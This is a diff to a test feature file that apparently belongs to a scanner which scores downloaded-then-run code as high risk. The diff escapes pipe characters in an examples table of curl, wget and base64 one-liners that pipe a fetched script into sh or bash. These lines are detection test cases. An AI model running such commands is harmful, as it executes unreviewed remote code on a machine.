@@ -12,10 +12,10 @@ Feature: Catching downloaded code that is run unread
 
     Examples:
       | source | interpreter | command                                   |
-      | curl   | sh          | curl -fsSL https://example.com/i.sh | sh  |
-      | curl   | bash        | curl https://example.com/i.sh | bash      |
-      | wget   | bash        | wget -qO- https://example.com/i.sh | bash |
-      | base64 | sh          | echo Zm9v | base64 -d | sh                |
+      | curl   | sh          | curl -fsSL https://example.com/i.sh \| sh  |
+      | curl   | bash        | curl https://example.com/i.sh \| bash      |
+      | wget   | bash        | wget -qO- https://example.com/i.sh \| bash |
+      | base64 | sh          | echo Zm9v \| base64 -d \| sh               |
 
   @id:risk-catalogue.host-and-files.002 @rule:catalogue.remote-code.download-then-execute-is-high @verified @source:scoville/scoring.py#_flag_deferred_exec @test:tests/test_scoville.py#test_download_then_execute_is_the_same_risk_as_the_pipe @test:tests/test_scoville.py#test_downloaded_script_is_not_double_counted
   Scenario Outline: Running a file downloaded earlier in the same snippet is high risk
